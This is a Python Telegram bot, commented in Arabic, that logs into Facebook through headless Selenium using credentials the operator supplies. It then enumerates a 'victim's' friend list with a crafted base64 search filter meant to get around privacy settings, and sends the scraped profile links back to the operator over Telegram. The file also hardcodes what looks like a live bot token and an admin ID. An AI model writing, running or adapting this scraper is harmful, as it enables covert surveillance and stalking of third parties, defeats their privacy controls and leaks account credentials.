import os
import telebot
import threading
import time
import base64
import re
from flask import Flask
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

# --- إعدادات البوت ---
BOT_TOKEN = '8345512854:AAGTrsdBKd90oxhBK83ZkFVSR0qh52ZYDto' 
ADMIN_ID = '7825994636' 

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
user_data = {}

# --- إعدادات المتصفح (نسخة 512MB RAM) ---
def get_chrome_options():
    chrome_options = webdriver.ChromeOptions()
    chrome_options.binary_location = os.environ.get("CHROME_BIN")
    chrome_options.add_argument("--headless") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--window-size=800,600") # شاشة صغيرة لتوفير الرام
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--blink-settings=imagesEnabled=false") # تعطيل الصور نهائياً
    return chrome_options

def send_live_shot(driver, chat_id, caption):
    try:
        tmp = f"shot_{int(time.time())}.png"
        driver.save_screenshot(tmp)
        with open(tmp, 'rb') as p:
            bot.send_photo(chat_id, p, caption=caption)
        os.remove(tmp)
    except: pass

@app.route('/')
def home(): return "Bot is Active"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# --- وظيفة السحب الاقتصادية ---
def start_scraping_process(chat_id, email, password, target_url):
    driver = None
    try:
        bot.send_message(chat_id, "🚀 بدء التشغيل بنمط توفير الطاقة (512MB RAM)...")
        driver = webdriver.Chrome(options=get_chrome_options())
        driver.set_page_load_timeout(120)

        # 1. الدخول
        driver.get('https://facebook.com')
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, 'email')))
        driver.find_element(By.ID, 'email').send_keys(email)
        driver.find_element(By.ID, 'pass').send_keys(password)
        driver.find_element(By.NAME, 'login').click()
        
        time.sleep(10)
        send_live_shot(driver, chat_id, "📸 حالة الدخول")

        # 2. استخراج المعرف
        driver.get(target_url)
        time.sleep(7)
        TARGET_UID = None
        match = re.search(r'"userID":"(\d+)"', driver.page_source) or re.search(r'id=(\d+)', target_url)
        if match: TARGET_UID = match.group(1)

        if not TARGET_UID:
            bot.send_message(chat_id, "❌ لم أجد المعرف. تأكد من الرابط.")
            driver.quit()
            return

        bot.send_message(chat_id, f"🆔 المعرف: {TARGET_UID}\n⏳ جاري البحث في أكثر الأسماء شيوعاً...")

        # 3. البحث الذكي (أهم الحروف لتوفير الوقت والرام)
        payload = '{"friends:0":"{\\"name\\":\\"users_friends_of_people\\",\\"args\\":\\"%s\\"}"}' % TARGET_UID.strip()
        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        friends_list = []
        
        # قائمة حروف ذكية تغطي أغلب الاحتمالات بسرعة
        smart_chars = ['a', 's', 'm', 'j', 'd', 'l', 'r', 'n', 'h', 'o']

        for char in smart_chars:
            try:
                driver.get(f"https://www.facebook.com/search/people/?q={char}&filters={encoded_payload}")
                time.sleep(5)
                # تمرير واحد فقط لتجنب تعليق السيرفر الضعيف
                driver.find_element(By.TAG_NAME, "body").send_keys(Keys.END)
                time.sleep(3)
                
                elements = driver.find_elements(By.XPATH, "//a[contains(@href, 'facebook.com')]")
                for el in elements:
                    href = el.get_attribute('href')
                    if href and 'facebook.com' in href:
                        clean = href.split('?')[0].split('&')[0]
                        if clean not in friends_list: friends_list.append(clean)
                
                bot.send_message(chat_id, f"✅ فحصت حرف ({char}) ووجدت {len(friends_list)} حتى الآن.")
                # صورة كل حرفين لتقليل الضغط
                if smart_chars.index(char) % 2 == 0:
                    send_live_shot(driver, chat_id, f"📸 ما يراه البوت عند حرف {char}")
            except: continue

        if friends_list:
            fname = f"result_{TARGET_UID}.txt"
            with open(fname, 'w') as f:
                for line in set(friends_list): f.write(f"{line}\n")
            with open(fname, 'rb') as d:
                bot.send_document(chat_id, d, caption=f"🎉 اكتمل السحب!\nالعدد المستخرج: {len(set(friends_list))}")
            os.remove(fname)
        else:
            bot.send_message(chat_id, "⚠️ لم أجد أصدقاء (قد يكون الحساب محمي جداً).")

    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
    finally:
        if driver: driver.quit()

# --- أوامر التفاعل ---
@bot.message_handler(commands=['start'])
def handle_start(message):
    if str(message.chat.id) != ADMIN_ID: return
    user_data[message.chat.id] = {}
    m = bot.send_message(message.chat.id, "أهلاً بك 👋\nأرسل **الإيميل**:")
    bot.register_next_step_handler(m, get_mail)

def get_mail(message):
    user_data[message.chat.id]['email'] = message.text
    m = bot.send_message(message.chat.id, "أرسل **الباسورد**:")
    bot.register_next_step_handler(m, get_pass)

def get_pass(message):
    user_data[message.chat.id]['password'] = message.text
    m = bot.send_message(message.chat.id, "أرسل **رابط الضحية**:")
    bot.register_next_step_handler(m, get_target)

def get_target(message):
    cid = message.chat.id
    threading.Thread(target=start_scraping_process, args=(cid, user_data[cid]['email'], user_data[cid]['password'], message.text)).start()

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.infinity_polling()
